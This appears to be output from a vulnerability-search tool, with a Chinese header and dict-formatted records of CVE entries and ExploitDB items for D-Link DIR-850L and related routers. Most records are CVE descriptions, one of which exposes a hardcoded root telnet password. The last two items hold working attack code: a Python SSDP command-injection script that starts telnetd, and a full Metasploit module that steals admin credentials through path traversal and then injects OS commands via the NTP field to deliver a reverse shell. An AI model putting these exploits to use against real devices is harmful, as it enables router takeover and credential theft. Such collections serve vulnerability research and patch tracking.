检索到漏洞和exp的总条数:27
{'source': 'CVE', '_id': '2018-20675', 'description': 'D-Link DIR-822 C1 before v3.11B01Beta, DIR-822-US C1 before v3.11B01Beta, DIR-850L A* before v1.21B08Beta, DIR-850L B* before v2.22B03Beta, and DIR-880L A* before v1.20B02Beta devices allow authentication bypass.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2018-20675'], 'msb': []}
{'source': 'CVE', '_id': '2018-20674', 'description': 'D-Link DIR-822 C1 before v3.11B01Beta, DIR-822-US C1 before v3.11B01Beta, DIR-850L A* before v1.21B08Beta, DIR-850L B* before v2.22B03Beta, and DIR-880L A* before v1.20B02Beta devices allow authenticated remote command execution.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2018-20674'], 'msb': []}
{'source': 'CVE', '_id': '2017-14415', 'description': 'D-Link DIR-850L REV. A (with firmware through FW114WWb07_h2ab_beta1) devices have XSS in the action parameter to htdocs/web/sitesurvey.php.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2017-14415'], 'msb': []}
{'source': 'CVE', '_id': '2017-14416', 'description': 'D-Link DIR-850L REV. A (with firmware through FW114WWb07_h2ab_beta1) devices have XSS in the action parameter to htdocs/web/wandetect.php.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2017-14416'], 'msb': []}
{'source': 'CVE', '_id': '2017-14413', 'description': 'D-Link DIR-850L REV. A (with firmware through FW114WWb07_h2ab_beta1) devices have XSS in the action parameter to htdocs/web/wpsacts.php.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2017-14413'], 'msb': []}
{'source': 'CVE', '_id': '2017-14414', 'description': 'D-Link DIR-850L REV. A (with firmware through FW114WWb07_h2ab_beta1) devices have XSS in the action parameter to htdocs/web/shareport.php.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2017-14414'], 'msb': []}
{'source': 'CVE', '_id': '2017-14427', 'description': 'D-Link DIR-850L REV. A (with firmware through FW114WWb07_h2ab_beta1) and REV. B (with firmware through FW208WWb02) devices have 0666 /var/run/storage_account_root permissions.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2017-14427'], 'msb': []}
{'source': 'CVE', '_id': '2016-6563', 'description': 'Processing malformed SOAP messages when performing the HNAP Login action causes a buffer overflow in the stack in some D-Link DIR routers. The vulnerable XML fields within the SOAP body are: Action, Username, LoginPassword, and Captcha. The following products are affected: DIR-823, DIR-822, DIR-818L(W), DIR-895L, DIR-890L, DIR-885L, DIR-880L, DIR-868L, and DIR-850L.', 'osvdb': [], 'bid': [94130], 'cve': ['CVE-2016-6563'], 'msb': []}
{'source': 'CVE', '_id': '2017-14428', 'description': 'D-Link DIR-850L REV. A (with firmware through FW114WWb07_h2ab_beta1) and REV. B (with firmware through FW208WWb02) devices have 0666 /var/run/hostapd* permissions.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2017-14428'], 'msb': []}
{'source': 'CVE', '_id': '2017-14425', 'description': 'D-Link DIR-850L REV. A (with firmware through FW114WWb07_h2ab_beta1) and REV. B (with firmware through FW208WWb02) devices have 0666 /var/etc/hnapasswd permissions.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2017-14425'], 'msb': []}
{'source': 'CVE', '_id': '2017-14417', 'description': 'register_send.php on D-Link DIR-850L REV. B (with firmware through FW208WWb02) devices does not require authentication, which can result in unintended enrollment in mydlink Cloud Services.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2017-14417'], 'msb': []}
{'source': 'CVE', '_id': '2017-14424', 'description': 'D-Link DIR-850L REV. A (with firmware through FW114WWb07_h2ab_beta1) and REV. B (with firmware through FW208WWb02) devices have 0666 /var/passwd permissions.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2017-14424'], 'msb': []}
{'source': 'CVE', '_id': '2017-3193', 'description': 'Multiple D-Link devices including the DIR-850L firmware versions 1.14B07 and 2.07.B05 contain a stack-based buffer overflow vulnerability in the web administration interface HNAP service.', 'osvdb': [], 'bid': [96747], 'cve': ['CVE-2017-3193'], 'msb': []}
{'source': 'CVE', '_id': '2017-14423', 'description': 'htdocs/parentalcontrols/bind.php on D-Link DIR-850L REV. A (with firmware through FW114WWb07_h2ab_beta1) devices does not prevent unauthenticated nonce-guessing attacks, which makes it easier for remote attackers to change the DNS configuration via a series of requests.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2017-14423'], 'msb': []}
{'source': 'CVE', '_id': '2017-14430', 'description': 'D-Link DIR-850L REV. A (with firmware through FW114WWb07_h2ab_beta1) and REV. B (with firmware through FW208WWb02) devices allow remote attackers to cause a denial of service (daemon crash) via crafted LAN traffic.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2017-14430'], 'msb': []}
{'source': 'CVE', '_id': '2017-14418', 'description': 'The D-Link NPAPI extension, as used in conjunction with D-Link DIR-850L REV. B (with firmware through FW208WWb02) devices, sends the cleartext admin password over the Internet as part of interaction with mydlink Cloud Services.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2017-14418'], 'msb': []}
{'code': '# Exploit Title: D-Link DIR-850L Wireless AC1200 Dual Band Gigabit Cloud Route Authentication Bypass\r\n# CVE: CVE-2018-9032\r\n# Date: 24-03-2018\r\n# Exploit Author: Gem George\r\n# Author Contact: https://www.linkedin.com/in/gemgrge\r\n# Vulnerable Product: D-Link DIR-850L Wireless AC1200 Dual Band Gigabit Cloud Router http://www.dlink.co.in/products/?pid=628\r\n# Firmware version: 1.02-2.06\r\n# Hardware version: A1, B1\r\n# Vendor Homepage: https://dlink.com\r\n\r\n\r\nVulnerability Details\r\n======================\r\nAn authentication bypass vulnerability on D-Link DIR-850L Wireless AC1200 Dual Band Gigabit Cloud Router potentially allows attackers to bypass SharePort Web Access Portal by directly accessing authenticated pages such as /category_view.php or /folder_view.php. This could potentially allow unauthorized remote access of media stored in SharePort and may perform write operation in the portal\r\n\r\nHow to exploit\r\n===================\r\nDirectly call authenticated URLs to bypass authentication\r\n\r\nExamples:\r\n* http://[router_ip][port]/category_view.php\r\n* http://[router_ip][port]/folder_view.php\r\n\r\nPOC\r\n=========\r\n* https://youtu.be/Wmm4p8znS3s', 'description': 'D-Link DIR-850L Wireless AC1200 Dual Band Gigabit Cloud Router - Authentication Bypass', 'author': 'Gem George', '_id': 44378, 'source': 'ExploitDB', 'platform': 'php', 'date': '2018-03-30T00:00:00+00:00', 'cve': ['CVE-2018-9032'], 'type': 'webapps', 'port': 0}
{'source': 'CVE', '_id': '2017-14419', 'description': 'The D-Link NPAPI extension, as used on D-Link DIR-850L REV. A (with firmware through FW114WWb07_h2ab_beta1) and REV. B (with firmware through FW208WWb02) devices, participates in mydlink Cloud Services by establishing a TCP relay service for HTTP, even though a TCP relay service for HTTPS is also established.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2017-14419'], 'msb': []}
{'source': 'CVE', '_id': '2017-14421', 'description': 'D-Link DIR-850L REV. B (with firmware through FW208WWb02) devices have a hardcoded password of wrgac25_dlink.2013gui_dir850l for the Alphanetworks account upon device reset, which allows remote attackers to obtain root access via a TELNET session.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2017-14421'], 'msb': []}
{'source': 'CVE', '_id': '2017-14426', 'description': 'D-Link DIR-850L REV. A (with firmware through FW114WWb07_h2ab_beta1) and REV. B (with firmware through FW208WWb02) devices have 0644 /var/etc/shadow (aka the /etc/shadow symlink target) permissions.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2017-14426'], 'msb': []}
{'source': 'CVE', '_id': '2018-9032', 'description': 'An authentication bypass vulnerability on D-Link DIR-850L Wireless AC1200 Dual Band Gigabit Cloud Router (Hardware Version : A1, B1; Firmware Version : 1.02-2.06) devices potentially allows attackers to bypass SharePort Web Access Portal by directly visiting /category_view.php or /folder_view.php.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2018-9032'], 'msb': []}
{'source': 'CVE', '_id': '2016-5681', 'description': 'Stack-based buffer overflow in dws/api/Login on D-Link DIR-850L B1 2.07 before 2.07WWB05, DIR-817 Ax, DIR-818LW Bx before 2.05b03beta03, DIR-822 C1 3.01 before 3.01WWb02, DIR-823 A1 1.00 before 1.00WWb05, DIR-895L A1 1.11 before 1.11WWb04, DIR-890L A1 1.09 before 1.09b14, DIR-885L A1 1.11 before 1.11WWb07, DIR-880L A1 1.07 before 1.07WWb08, DIR-868L B1 2.03 before 2.03WWb01, and DIR-868L C1 3.00 before 3.00WWb01 devices allows remote attackers to execute arbitrary code via a long session cookie.', 'osvdb': [], 'bid': [92427], 'cve': ['CVE-2016-5681'], 'msb': []}
{'source': 'CVE', '_id': '2017-14422', 'description': "D-Link DIR-850L REV. A (with firmware through FW114WWb07_h2ab_beta1) and REV. B (with firmware through FW208WWb02) devices use the same hardcoded /etc/stunnel.key private key across different customers' installations, which allows remote attackers to defeat the HTTPS cryptographic protection mechanisms by leveraging knowledge of this key from another installation.", 'osvdb': [], 'bid': [], 'cve': ['CVE-2017-14422'], 'msb': []}
{'source': 'CVE', '_id': '2017-14420', 'description': 'The D-Link NPAPI extension, as used on D-Link DIR-850L REV. A (with firmware through FW114WWb07_h2ab_beta1) and REV. B (with firmware through FW208WWb02) devices, does not verify X.509 certificates from SSL servers, which allows man-in-the-middle attackers to spoof servers and obtain sensitive information via a crafted certificate.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2017-14420'], 'msb': []}
{'source': 'CVE', '_id': '2017-14429', 'description': 'The DHCP client on D-Link DIR-850L REV. A (with firmware through FW114WWb07_h2ab_beta1) and REV. B (with firmware through FW208WWb02) devices allows unauthenticated remote code execution as root because /etc/services/INET/inet_ipv4.php mishandles shell metacharacters, affecting generated files such as WAN-1-udhcpc.sh.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2017-14429'], 'msb': []}
{'code': '## Advisory Information\r\n\r\nTitle: SSDP command injection using UDP for a lot of Dlink routers including DIR-815, DIR-850L\r\nVendors contacted: William Brown <william.brown@dlink.com> (Dlink)\r\nRelease mode: Released\r\nCVE: None\r\n\r\nNote: All these security issues have been discussed with the vendor and vendor indicated that they have fixed issues as per the email communication. The vendor had also released the information on their security advisory pages http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10060, \r\nhttp://securityadvisories.dlink.com/security/publication.aspx?name=SAP10061\r\n\r\nHowever, the vendor has taken now the security advisory pages down and hence the information needs to be publicly accessible so that users using these devices can update the router firmwares. The author (Samuel Huntley) releasing this finding is not responsible for anyone using this information for malicious purposes.\r\n\r\n## Product Description\r\n\r\nMany Dlink routers affected. Tested on DIR-815.\r\n\r\n## Vulnerabilities Summary\r\n\r\nDIR-815,850L and most of Dlink routers are susceptible to this flaw. This allows to perform command injection using SSDP packets and on UDP. So no authentication required. Just the fact that the attacker needs to be on wireless LAN or be able to fake a request coming from internal wireless LAN using some other mechanism.\r\n\r\n## Details\r\n\r\n# Command injection\r\n----------------------------------------------------------------------------------------------------------------------\r\nimport socket\r\nimport struct\r\n\r\n# This vulnerability is pretty much in every router that has cgibin and uses SSDP code in that cgibin. This one worked on the device dir-815. Will work only in WLAN\r\n\r\n\r\nbuf = \'M-SEARCH * HTTP/1.1\\r\\nHOST:239.255.255.250:1900\\r\\nST:urn:schemas-upnp-org:service:WANIPConnection:1;telnetd -p 9094;ls\\r\\nMX:2\\r\\nMAN:"ssdp:discover"\\r\\n\\r\\n\'\r\n\r\nprint "[+] sending buffer size", len(buf)\r\ns = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\r\ns.connect(("239.255.255.250", 1900))\r\ns.send(buf)\r\ns.close()\r\n\r\n\r\n----------------------------------------------------------------------------------------------------------------------\r\n\r\n\r\n## Report Timeline\r\n\r\n* Jan 22, 2015: Vulnerability found by Samuel Huntley by William Brown.\r\n* Feb 15, 2015: Vulnerability is patched by Dlink\r\n* Nov 13, 2015: A public advisory is sent to security mailing lists.\r\n\r\n## Credit\r\n\r\nThis vulnerability was found by Samuel Huntley', 'description': 'D-Link DIR-815 / DIR-850L - SSDP Command Injection', 'author': 'Samuel Huntley', '_id': 38715, 'source': 'ExploitDB', 'platform': 'hardware', 'date': '2015-11-16T00:00:00+00:00', 'cve': [], 'type': 'remote', 'port': 1900}
{'code': '##\r\n# This module requires Metasploit: https://metasploit.com/download\r\n# Current source: https://github.com/rapid7/metasploit-framework\r\n##\r\n\r\nrequire \'openssl\'\r\n\r\nclass MetasploitModule < Msf::Exploit::Remote\r\n  Rank = ExcellentRanking\r\n\r\n  include Msf::Exploit::Remote::HttpClient\r\n  include Msf::Auxiliary::Report\r\n  include Msf::Exploit::CmdStager\r\n\r\n  def initialize(info = {})\r\n    super(update_info(info,\r\n      \'Name\' => \'DIR-850L (Un)authenticated OS Command Exec\',\r\n      \'Description\' => %q{\r\n        This module leverages an unauthenticated credential disclosure\r\n        vulnerability to then execute arbitrary commands on DIR-850L routers\r\n        as an authenticated user. Unable to use Meterpreter payloads.\r\n      },\r\n      \'Author\' => [\r\n        \'Mumbai\', # https://github.com/realoriginal (module)\r\n        \'Zdenda\' # vuln discovery\r\n      ],\r\n      \'References\' => [\r\n        [\'URL\', \'https://www.seebug.org/vuldb/ssvid-96333\'],\r\n        [\'URL\', \'https://blogs.securiteam.com/index.php/archives/3310\'],\r\n      ],\r\n      \'DisclosureDate\' => \'Aug 9 2017\',\r\n      \'License\' => MSF_LICENSE,\r\n      \'Platform\' => \'linux\',\r\n      \'Arch\' => ARCH_MIPSBE,\r\n      \'DefaultTarget\' => 0,\r\n      \'DefaultOptions\' => {\r\n        \'PAYLOAD\' => \'linux/mipsbe/shell/reverse_tcp\'\r\n      },\r\n      \'Privileged\' => true,\r\n      \'Payload\' => {\r\n        \'DisableNops\' => true,\r\n      },\r\n      \'Targets\' => [[ \'Automatic\', {} ]],\r\n    ))\r\n  end\r\n\r\n  def check\r\n    begin\r\n      res = send_request_cgi({\r\n        \'uri\' => \'/\',\r\n        \'method\' => \'GET\'\r\n        })\r\n      if res && res.headers[\'Server\']\r\n        auth = res.headers[\'Server\']\r\n        if auth =~ /DIR-850L/\r\n          if auth =~ /WEBACCESS\\/1\\.0/\r\n            return Exploit::CheckCode::Safe\r\n          else\r\n            return Exploit::CheckCode::Detected\r\n          end\r\n        end\r\n      end\r\n    rescue ::Rex::ConnectionError\r\n      return Exploit::CheckCode::Unknown\r\n    end\r\n    Exploit::CheckCode::Unknown\r\n  end\r\n\r\n  def report_cred(opts)\r\n    service_data = {\r\n      address: opts[:ip],\r\n      port: opts[:port],\r\n      service_name: opts[:service_name],\r\n      protocol: \'tcp\',\r\n      workspace_id: myworkspace_id\r\n    }\r\n\r\n    credential_data = {\r\n      origin_type: :service,\r\n      module_fullname: fullname,\r\n      username: opts[:user],\r\n      private_data: opts[:password],\r\n      private_type: :password\r\n    }.merge(service_data)\r\n\r\n    login_data = {\r\n      core: create_credential(credential_data),\r\n      status: Metasploit::Model::Login::Status::UNTRIED,\r\n      proof: opts[:proof]\r\n    }.merge(service_data)\r\n\r\n    create_credential_login(login_data)\r\n  end\r\n\r\n\r\n  # some other DIR-8X series routers are vulnerable to this same retrieve creds vuln as well...\r\n  # should write an auxiliary module to-do -> WRITE AUXILIARY\r\n  def retrieve_creds\r\n    begin\r\n      xml = "<?xml version=\\"1.0\\" encoding=\\"utf-8\\"?>\\r\\n"\r\n      xml << "<postxml>\\r\\n"\r\n      xml << "<module>\\r\\n"\r\n      xml << "  <service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service>\\r\\n"\r\n      xml << "</module>\\r\\n"\r\n      xml << "</postxml>"\r\n      res = send_request_cgi({\r\n        \'uri\' => \'/hedwig.cgi\',\r\n        \'method\' => \'POST\',\r\n        \'encode_params\' => false,\r\n        \'headers\' => {\r\n          \'Accept-Encoding\' => \'gzip, deflate\',\r\n          \'Accept\' => \'*/*\'\r\n        },\r\n        \'ctype\' => \'text/xml\',\r\n        \'cookie\' => "uid=#{Rex::Text.rand_text_alpha_lower(8)}",\r\n        \'data\' => xml,\r\n      })\r\n      if res.body =~ /<password>(.*)<\\/password>/ # fixes stack trace issue\r\n        parse = res.get_xml_document\r\n        username = parse.at(\'//name\').text\r\n        password = parse.at(\'//password\').text\r\n        vprint_good("#{peer} - Retrieved the username/password combo #{username}/#{password}")\r\n        loot = store_loot("dlink.dir850l.login", "text/plain", rhost, res.body)\r\n        print_good("#{peer} - Downloaded credentials to #{loot}")\r\n        return username, password\r\n      else\r\n        fail_with(Failure::NotFound, "#{peer} - Credentials could not be obtained")\r\n      end\r\n    rescue ::Rex::ConnectionError\r\n      fail_with(Failure::Unknown, "#{peer} - Unable to connect to target.")\r\n    end\r\n  end\r\n\r\n  def retrieve_uid\r\n    begin\r\n      res = send_request_cgi({\r\n          \'uri\' => \'/authentication.cgi\',\r\n          \'method\' => \'GET\',\r\n      })\r\n      parse = res.get_json_document\r\n      uid = parse[\'uid\']\r\n      challenge = parse[\'challenge\']\r\n      return uid, challenge\r\n    rescue ::Rex::ConnectionError\r\n      fail_with(Failure::Unknown, "#{peer} - Unable to connect to target.")\r\n    end\r\n  end\r\n\r\n  def login(username, password)\r\n    uid, challenge = retrieve_uid\r\n    begin\r\n      hash = OpenSSL::HMAC.hexdigest(OpenSSL::Digest.new(\'md5\'), password.to_s, (username.to_s + challenge.to_s)).upcase\r\n      send_request_cgi({\r\n        \'uri\' => \'/authentication.cgi\',\r\n        \'method\' => \'POST\',\r\n        \'data\' => "id=#{username}&password=#{hash}",\r\n        \'cookie\' => "uid=#{uid}"\r\n      })\r\n      return uid\r\n    rescue ::Rex::ConnectionError\r\n      fail_with(Failure::Unknown, "#{peer} - Unable to connect to target.")\r\n    end\r\n  end\r\n\r\n  def execute_command(cmd, opts)\r\n    uid = login(@username, @password) # reason being for loop is cause UID expires for some reason after executing 1 command\r\n    payload = "<?xml version=\\"1.0\\" encoding=\\"utf-8\\"?>\\r\\n"\r\n    payload << "<postxml>\\r\\n"\r\n    payload << "<module>\\r\\n"\r\n    payload << "  <service>DEVICE.TIME</service>\\r\\n"\r\n    payload << "  <device>\\r\\n"\r\n    payload << "    <time>\\r\\n"\r\n    payload << "      <ntp>\\r\\n"\r\n    payload << "        <enable>1</enable>\\r\\n"\r\n    payload << "        <period>604800</period>\\r\\n"\r\n    payload << "        <server>#{Rex::Text.rand_text_alpha_lower(8)}; (#{cmd}&); </server>\\r\\n"\r\n    payload << "      </ntp>\\r\\n"\r\n    payload << "      <ntp6>\\r\\n"\r\n    payload << "        <enable>1</enable>\\r\\n"\r\n    payload << "        <period>604800</period>\\r\\n"\r\n    payload << "      </ntp6>\\r\\n"\r\n    payload << "      <timezone>20</timezone>\\r\\n"\r\n    payload << "      <time/>\\r\\n"\r\n    payload << "      <date/>\\r\\n"\r\n    payload << "      <dst>0</dst>\\r\\n"\r\n    payload << "      <dstmanual/>\\r\\n"\r\n    payload << "      <dstoffset/>\\r\\n"\r\n    payload << "    </time>\\r\\n"\r\n    payload << "  </device>\\r\\n"\r\n    payload << "</module>\\r\\n"\r\n    payload << "</postxml>"\r\n    begin\r\n      # save configuration\r\n      res = send_request_cgi({\r\n        \'uri\' => \'/hedwig.cgi\',\r\n        \'method\' => \'POST\',\r\n        \'ctype\' => \'text/xml\',\r\n        \'data\' => payload,\r\n        \'cookie\' => "uid=#{uid}"\r\n      })\r\n      # execute configuration\r\n      res = send_request_cgi({\r\n        \'uri\' => \'/pigwidgeon.cgi\',\r\n        \'method\' => \'POST\',\r\n        \'data\' => \'ACTIONS=SETCFG,ACTIVATE\',\r\n        \'cookie\' => "uid=#{uid}"\r\n      })\r\n      return res\r\n    rescue ::Rex::ConnectionError\r\n      fail_with(Failure::Unknown, "#{peer} - Unable to connect to target.")\r\n    end\r\n  end\r\n\r\n\r\n  def exploit\r\n    print_status("#{peer} - Connecting to target...")\r\n\r\n    unless check == Exploit::CheckCode::Detected\r\n      fail_with(Failure::Unknown, "#{peer} - Failed to access vulnerable url")\r\n    end\r\n    #\r\n    # Information Retrieval, obtains creds and logs in\r\n    #\r\n    @username, @password = retrieve_creds\r\n    execute_cmdstager(\r\n      :flavor => :wget,\r\n      :linemax => 200\r\n    )\r\n  end\r\nend', 'description': 'D-Link DIR-850L - OS Command Execution (Metasploit)', 'author': 'Metasploit', '_id': 43143, 'source': 'ExploitDB', 'platform': 'linux_mips', 'date': '2017-11-14T00:00:00+00:00', 'cve': [], 'type': 'remote', 'port': 0}
